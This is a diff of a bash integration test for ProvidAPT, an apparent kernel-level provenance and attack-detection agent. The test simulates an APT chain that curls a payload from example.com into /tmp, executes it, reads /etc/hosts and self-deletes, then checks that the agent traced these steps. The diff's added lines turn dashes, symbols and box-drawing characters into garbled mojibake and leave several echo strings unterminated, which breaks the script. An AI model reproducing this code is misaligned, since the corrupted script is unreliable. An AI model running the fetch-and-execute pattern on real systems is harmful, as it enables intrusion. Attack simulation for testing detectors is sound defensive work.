@@ -1,9 +1,9 @@
 #!/usr/bin/env bash
 # =============================================================
-# ProvidAPT v2.0 — Full Validation Test
+# ProvidAPT 閳-Full Validation Test
 #
 # Tests the complete pipeline:
-#   1. Build & deploy v2.0
+#   1. Build and deploy the current release
 #   2. Simulate APT attack chain
 #   3. Auto-validate provenance trace-back
 #   4. Performance benchmark
@@ -13,8 +13,8 @@
 #   sudo bash test/integration/full_validation.sh --skip-build
 #
 # Exit codes:
-#   0 — All tests passed
-#   1 — One or more checks failed
+#   0 閳-All tests passed
+#   1 閳-One or more checks failed
 # =============================================================
 set -euo pipefail
 
@@ -37,10 +37,10 @@ check() {
     local name="$1"
     local result="$2"
     if [ "$result" = "true" ] || [ "$result" = "0" ] || [ "$result" = "ok" ]; then
-        echo -e "  ${GREEN}✓${NC} $name"
+        echo -e "  ${GREEN}閴-{NC} $name"
         PASS=$((PASS + 1))
     else
-        echo -e "  ${RED}✗${NC} $name"
+        echo -e "  ${RED}閴-{NC} $name"
         echo "    $3"
         FAIL=$((FAIL + 1))
     fi
@@ -55,23 +55,23 @@ cleanup() {
 trap cleanup EXIT
 
 echo ""
-echo "╔══════════════════════════════════════════════════════════════╗"
-echo "║        ProvidAPT v2.0 — Full Validation Test                 ║"
-echo "╚══════════════════════════════════════════════════════════════╝"
+echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧"
+echo "閳-       ProvidAPT 閳-Full Validation Test                 閳-
+echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕"
 echo ""
 
-# ── Step 1: Build v2.0 ─────────────────────────────────────
-echo "[1/6] Building ProvidAPT v2.0..."
+# 閳光偓閳光偓 Step 1: Build release binaries 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
+echo "[1/6] Building ProvidAPT..."
 
 if [ "${1:-}" != "--skip-build" ]; then
     make v2 2>&1 | tail -3
-    check "v2 build" "$(test -f build/bin/providapt-v2 && echo true || echo false)" \
-        "Binary not found at build/bin/providapt-v2"
+    check "v2 build" "$(test -f build/bin/providaptd && echo true || echo false)" \
+        "Binary not found at build/bin/providaptd"
 else
     echo "  (skip-build flag set)"
 fi
 
-# ── Step 2: System verification ─────────────────────────────
+# 閳光偓閳光偓 Step 2: System verification 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[2/6] Verifying system..."
 SYSTEM_LOG="$OUTPUT_DIR/system.log"
@@ -80,9 +80,9 @@ echo "  Kernel: $(uname -r)" | tee -a "$SYSTEM_LOG"
 echo "  CPU:    $(nproc) cores" | tee -a "$SYSTEM_LOG"
 echo "  Memory: $(free -h | grep Mem | awk '{print $2}')" | tee -a "$SYSTEM_LOG"
 
-check "kernel version ≥ 5.11" \
+check "kernel version 閳-5.11" \
     "$(awk '{print $2}' /proc/version | cut -d- -f1 | awk -F. '{if ($1>=5 && $2>=11) print "true"}')" \
-    "Need kernel ≥ 5.11 for BPF LSM"
+    "Need kernel 閳-5.11 for BPF LSM"
 
 check "BTF availability" \
     "$(test -f /sys/kernel/btf/vmlinux && echo true || echo false)" \
@@ -92,16 +92,16 @@ check "root access" \
     "$(test "$(id -u)" -eq 0 && echo true || echo false)" \
     "Must run as root"
 
-# ── Step 3: Start v2.0 agent ───────────────────────────────
+# 閳光偓閳光偓 Step 3: Start release agent 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
-echo "[3/6] Starting ProvidAPT v2.0 agent..."
+echo "[3/6] Starting ProvidAPT agent..."
 AGENT_LOG="$OUTPUT_DIR/agent.log"
 
-STORE_DIR="/tmp/providapt-v2-store-$$"
+STORE_DIR="/tmp/providapt-store-$$"
 mkdir -p "$STORE_DIR"
 
 # Start v2 agent in background
-./build/bin/providapt-v2 > "$AGENT_LOG" 2>&1 &
+./build/bin/providaptd > "$AGENT_LOG" 2>&1 &
 AGENT_PID=$!
 sleep 2
 
@@ -113,12 +113,12 @@ check "agent started (PID $AGENT_PID)" \
 BASELINE_CPU=$(ps -p "$AGENT_PID" -o %cpu= 2>/dev/null || echo 0)
 echo "  Baseline CPU: ${BASELINE_CPU}%"
 
-# ── Step 4: Attack simulation ──────────────────────────────
+# 閳光偓閳光偓 Step 4: Attack simulation 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[4/6] Simulating APT attack chain..."
 ATTACK_LOG="$OUTPUT_DIR/attack.log"
 
-# Phase 1 — Download stage
+# Phase 1 閳-Download stage
 echo "  [Phase 1] Downloading malicious payload..." | tee -a "$ATTACK_LOG"
 curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || \
     echo "#!/bin/bash" > /tmp/evil_v2.sh && \
@@ -126,19 +126,19 @@ curl -s -o /tmp/evil_v2.sh "http://example.com/payload" 2>/dev/null || \
 chmod +x /tmp/evil_v2.sh
 sleep 1
 
-# Phase 2 — Execute stage
+# Phase 2 閳-Execute stage
 echo "  [Phase 2] Executing payload..." | tee -a "$ATTACK_LOG"
 /tmp/evil_v2.sh 2>/dev/null
 sleep 1
 
-# Phase 3 — Tamper stage
+# Phase 3 閳-Tamper stage
 echo "  [Phase 3] Tampering with system configuration..." | tee -a "$ATTACK_LOG"
 # Simulated: read sensitive file, modify hosts
 cat /etc/hosts > /dev/null
 echo "# TAMPERED BY ATTACKER" >> /tmp/hosts_tamper_test
 sleep 1
 
-# Phase 4 — Self-delete stage
+# Phase 4 閳-Self-delete stage
 echo "  [Phase 4] Self-deleting evidence..." | tee -a "$ATTACK_LOG"
 rm -f /tmp/evil_v2.sh
 rm -f /tmp/hosts_tamper_test
@@ -157,7 +157,7 @@ done
 
 echo "  Peak CPU during attack: ${MAX_CPU}%"
 
-# ── Step 5: Validation ─────────────────────────────────────
+# 閳光偓閳光偓 Step 5: Validation 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[5/6] Validating provenance capture..."
 
@@ -187,13 +187,13 @@ check "agent logged operations" \
     "$(grep -c "store" "$AGENT_LOG" 2>/dev/null || echo 0)" \
     "No storage operations logged"
 
-# ── Step 6: Performance report ─────────────────────────────
+# 閳光偓閳光偓 Step 6: Performance report 閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓閳光偓
 echo ""
 echo "[6/6] Generating validation report..."
 REPORT="$OUTPUT_DIR/v2_validation_report.txt"
 
 cat > "$REPORT" << REPORT
-ProvidAPT v2.0 — Validation Report
+ProvidAPT 閳-Validation Report
 ===================================
 Date:       $(date -Iseconds)
 Kernel:     $(uname -r)
@@ -221,17 +221,17 @@ Store Stats:
 REPORT
 
 if [ "$FAIL" -eq 0 ]; then
-    echo "╔══════════════════════════════════════════════════════════════╗" >> "$REPORT"
-    echo "║  ✅ v2.0 VALIDATION PASSED — All checks passed               ║" >> "$REPORT"
-    echo "╚══════════════════════════════════════════════════════════════╝" >> "$REPORT"
+    echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧" >> "$REPORT"
+    echo "閳- 閴-RELEASE VALIDATION PASSED 閳-All checks passed               閳- >> "$REPORT"
+    echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕" >> "$REPORT"
 else
-    echo "⚠ Some checks failed ($FAIL failures)" >> "$REPORT"
+    echo "閳-Some checks failed ($FAIL failures)" >> "$REPORT"
 fi
 
 echo ""
-echo "╔══════════════════════════════════════════════════════════════╗"
-echo "║  Validation Complete                                         ║"
-echo "╚══════════════════════════════════════════════════════════════╝"
+echo "閳烘柡鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫧"
+echo "閳- Validation Complete                                         閳-
+echo "閳烘埃鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ櫜閳烘劏鏅查埡鎰ㄦ殕"
 echo ""
 echo "  Report: $REPORT"
 echo "  Passed: $PASS / $TOTAL"
@@ -240,11 +240,11 @@ echo "  Peak CPU: ${MAX_CPU}%"
 echo ""
 
 if [ "$FAIL" -eq 0 ]; then
-    echo -e "  ${GREEN}✓ v2.0 VALIDATION PASSED${NC}"
+    echo -e "  ${GREEN}閴-RELEASE VALIDATION PASSED${NC}"
     echo ""
     exit 0
 else
-    echo -e "  ${RED}✗ Some checks failed (see $REPORT)${NC}"
+    echo -e "  ${RED}閴-Some checks failed (see $REPORT)${NC}"
     echo ""
     exit 1
 fi
